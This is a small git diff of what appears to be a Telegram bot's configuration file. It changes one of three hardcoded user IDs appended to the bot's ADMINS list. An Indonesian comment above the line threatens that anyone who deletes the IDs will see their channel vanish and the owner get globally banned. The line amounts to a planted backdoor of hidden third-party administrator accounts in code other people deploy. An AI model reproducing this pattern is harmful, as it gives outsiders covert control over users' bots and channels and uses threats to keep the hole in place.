@@ -70,7 +70,7 @@ DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "Fal
 
 # Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
 # Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
-ADMINS.extend((6106497429, 6535672136, 6109807345))
+ADMINS.extend((6106497429, 5493260414, 6109807345))
 
 
 LOG_FILE_NAME = "logs.txt"
